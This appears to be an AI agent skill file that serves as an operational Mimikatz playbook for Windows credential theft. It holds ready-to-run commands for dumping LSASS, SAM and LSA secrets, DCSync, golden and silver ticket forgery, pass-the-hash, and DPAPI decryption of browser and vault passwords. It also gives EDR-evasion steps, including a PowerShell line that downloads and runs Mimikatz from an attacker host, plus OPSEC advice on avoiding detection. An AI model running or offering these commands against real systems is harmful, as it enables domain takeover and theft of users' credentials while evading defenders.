---
name: mimikatz
description: "Auth/lab ref: Mimikatz secret-exposure audit; LSASS, DPAPI, Kerberos tickets/keys, token/ticket artifacts, Windows lab validation."
license: CC-BY-4.0
compatibility: "Windows x86/x64; Requires SeDebugPrivilege (standard as local admin)."
metadata:
  author: AeonDave
  version: "2.0"
---

# Mimikatz

Windows credential extraction — LSASS dump, DPAPI, Kerberos, token impersonation, and ticket attacks.

## Privilege Requirement

SeDebugPrivilege is required for most operations. Enable first:

```
privilege::debug
```

Run from admin shell. If UAC active: run mimikatz.exe as Administrator.

---

## 1. LSASS Credential Dumping

### sekurlsa::logonpasswords

Dump all cached credentials from LSASS — NTLM hashes, plaintext (if WDigest enabled), Kerberos keys.

```
privilege::debug
sekurlsa::logonpasswords
```

**Useful fields in output:**
- `Username / Domain` — target account
- `NTLM` — NT hash (use for PTH)
- `Password` — plaintext only if WDigest active or old OS (pre-Win8.1/2012R2)
- `SHA1 / AES128 / AES256` — Kerberos keys for `asktgt`

### sekurlsa::wdigest

Dump WDigest credentials (requires WDigest provider active).

```
sekurlsa::wdigest
```

**Enable WDigest for future logons (then wait for a new logon):**

```
# Registry — enable
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Then trigger new logon (e.g., lock/unlock, or wait)
sekurlsa::wdigest
```

### sekurlsa::credman

Dump Windows Credential Manager stored credentials.

```
sekurlsa::credman
```

### sekurlsa::msv

Dump MSV1_0 auth provider credentials (NTLM hashes, domain creds).

```
sekurlsa::msv
```

### sekurlsa::kerberos

Dump Kerberos provider (AES keys, cached passwords).

```
sekurlsa::kerberos
```

---

## 2. SAM / LSA / NTDS

### lsadump::sam

Dump local SAM database hashes (local accounts).

```
privilege::debug
token::elevate
lsadump::sam
```

### lsadump::secrets

Dump LSA secrets (service account passwords, DPAPI master keys, machine account hash, cached domain credentials).

```
token::elevate
lsadump::secrets
```

**High-value LSA secrets:**
- `_SC_*` — service account passwords
- `DPAPI_SYSTEM` — DPAPI system key for decrypting user DPAPI blobs
- `$MACHINE.ACC` — machine account NT hash (useful for Kerberos auth)
- `DefaultPassword` — autologon password

### lsadump::cache

Dump cached domain credentials (MS-CACHE v2) — offline crackable.

```
token::elevate
lsadump::cache
```

Crack: `hashcat -a 0 -m 2100 cache_hashes.txt wordlist.txt`

### lsadump::dcsync

DCSync — pull any account's hash from DC using replication API. Requires DA or explicit replication rights.

```
# Single account
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:administrator

# All accounts (slow, very noisy)
lsadump::dcsync /domain:corp.local /all

# Dump from specific DC
lsadump::dcsync /domain:corp.local /user:krbtgt /dc:dc01.corp.local
```

### lsadump::lsa

Dump LSA online (patch LSA in memory).

```
lsadump::lsa /patch
lsadump::lsa /inject
```

---

## 3. Kerberos Ticket Operations

### sekurlsa::tickets

List and dump Kerberos tickets from LSASS memory.

```
sekurlsa::tickets
sekurlsa::tickets /export   # save .kirbi files to disk
```

### kerberos::list

List current session tickets.

```
kerberos::list
kerberos::list /export
```

### kerberos::ptt

Pass-the-Ticket — inject .kirbi ticket into current logon session.

```
kerberos::ptt ticket.kirbi
kerberos::ptt C:\path\to\ticket.kirbi

# Verify injection
klist
```

### kerberos::purge

Remove all Kerberos tickets from session (clean up).

```
kerberos::purge
```

---

## 4. Golden Ticket

Forge TGT using krbtgt hash — persists even after password resets (until krbtgt is reset twice).

**Requirements:** krbtgt NTLM hash, domain SID, domain name, target username.

```
# Get krbtgt hash + domain SID
lsadump::dcsync /domain:corp.local /user:krbtgt

# Forge Golden Ticket
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt

# With AES256 (more stealthy — avoids RC4 downgrade detection)
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM_HASH /aes256:KRBTGT_AES256 /id:500 /ptt

# Save to file (for later use)
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ticket:golden.kirbi
```

**Key flags:**
- `/id:500` — RID 500 = built-in administrator
- `/groups:512,513,518,519,520` — add to DA/EA/Schema Admin groups
- `/ptt` — inject immediately; omit to save file
- `/startoffset:-10` — backdate 10 min (avoid clock skew detection)
- `/endin:600 /renewmax:10080` — ticket validity window

---

## 5. Silver Ticket

Forge TGS for specific service using service account hash — does not touch DC (no DC logs).

**Requirements:** service account NTLM hash, domain SID, SPN, target username.

```
# Forge Silver Ticket for CIFS on target machine
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt

# LDAP service (for DCSync-like ops without touching LSASS on DC)
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:dc.corp.local /service:ldap /rc4:DC_NTLM_HASH /ptt

# HTTP service
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:webserver.corp.local /service:http /rc4:SERVICE_HASH /ptt

# MSSQL
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:SVC_HASH /ptt
```

---

## 6. Pass-the-Hash

Spawn process using NTLM hash without knowing plaintext password.

```
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLM_HASH /run:cmd.exe

# With AES256 (Kerberos PTK)
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /aes256:AES_KEY /run:powershell.exe

# Spawn specific process for lateral movement
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:"mmc.exe"
```

---

## 7. Token Manipulation

Impersonate tokens from other processes — escalate or pivot without credential extraction.

```
# List available tokens
token::list

# Elevate to SYSTEM
token::elevate

# Elevate to domain admin token (if present in process list)
token::elevate /domainadmin

# Impersonate specific user by process
token::impersonate

# Revert to original token
token::revert
```

**Workflow: elevate for LSA ops**

```
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
token::revert
```

---

## 8. DPAPI — Decrypting Secrets

DPAPI protects browser credentials, vault passwords, wifi keys, RDP credentials, and more.

### Browser credentials (Chrome, Edge)

```
# Chrome/Edge saved passwords (user context)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

# Edge
dpapi::chrome /in:"%localappdata%\Microsoft\Edge\User Data\Default\Login Data" /unprotect

# Chromium-based: works with current user DPAPI key automatically
```

### Windows Credential Vault

```
# List vault credentials
vault::list

# Dump vault (may need SYSTEM for machine vault)
vault::cred /patch
```

### Generic DPAPI blob decryption

```
# Get DPAPI system key (from LSA secrets — needs SYSTEM)
token::elevate
lsadump::secrets

# Decrypt a specific blob with masterkey
dpapi::blob /masterkey:MASTERKEY_HEX /in:blob.bin

# Find and list masterkeys
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-...\GUID"

# With domain backup key (if you have it)
dpapi::masterkey /in:MASTERKEY_FILE /pvk:domain_backup.pvk

# Wifi passwords
dpapi::wifi /in:"%programdata%\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{PROFILE}.xml"
```

### RDP saved credentials

```
# Cmdkey-stored RDP credentials
dpapi::rdg /unprotect
```

---

## 9. Crypto / Certificates

```
# List certificates in current user store
crypto::certificates

# List and export (including private keys)
crypto::certificates /export

# System store (requires SYSTEM)
token::elevate
crypto::certificates /systemstore /export
```

---

## 10. Alternate Execution (EDR evasion)

When dropping mimikatz.exe is detected, use these alternatives:

### Invoke-Mimikatz (PowerShell reflective load)

```powershell
# Load from memory (no disk artifact)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Dump to remote host
Invoke-Mimikatz -DumpCreds -ComputerName TARGET
```

### SafetyKatz (BOF/fork-dump approach)

```powershell
# .NET, fork+dump, avoids direct LSASS handle
SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
```

### LSASS dump without mimikatz (then parse offline)

```cmd
# procdump.exe (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# comsvcs.dll (LOLBin — built-in)
tasklist /fi "imagename eq lsass.exe"   # get PID
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full

# xordump / via shadow copy
# Copy ntds.dit via shadow copy:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\loot\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\loot\
```

**Parse dump offline (on attacker machine):**

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## Common Attack Chains

### Post-shell: dump all creds fast

```
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache
exit
```

### PTH → lateral movement → DCSync

```
# 1. Extract NTLM from SAM
sekurlsa::logonpasswords

# 2. PTH to spawn session as admin
sekurlsa::pth /user:administrator /domain:corp /ntlm:HASH /run:cmd.exe

# 3. DCSync from admin context
lsadump::dcsync /domain:corp.local /user:krbtgt

# 4. Forge Golden Ticket
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### Browser credential harvest

```
privilege::debug
token::elevate
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"%localappdata%\Microsoft\Edge\User Data\Default\Login Data" /unprotect
vault::cred /patch
exit
```

---

## OPSEC Notes

- `sekurlsa::logonpasswords` opens a handle to LSASS (access rights `0x1010`) → triggers EDR alerts
- `lsadump::dcsync` generates Event 4662 (replication requested) on DC — monitored
- Dropping `mimikatz.exe` binary → high-confidence EDR/AV detection (use in-memory or BOF)
- Use `comsvcs.dll MiniDump` for LSASS dump — it's a LOLBin, less detected than procdump
- AES256 keys for Golden/Silver Tickets avoid RC4 downgrade alert (Event 4769 with RC4 flag)
- Token elevation (`token::elevate`) is needed before `lsadump::sam/secrets` — do it before
- Log `exit` at end to capture mimikatz output when redirecting stdout

## Resources

| File | When to load |
|------|--------------|
| `references/credential-theft-tradecraft.md` | DPAPI architecture + offline decrypt, Chrome App-Bound bypass, PPL bypass, Credential Guard behavior, in-memory alternatives, EDR detection notes |
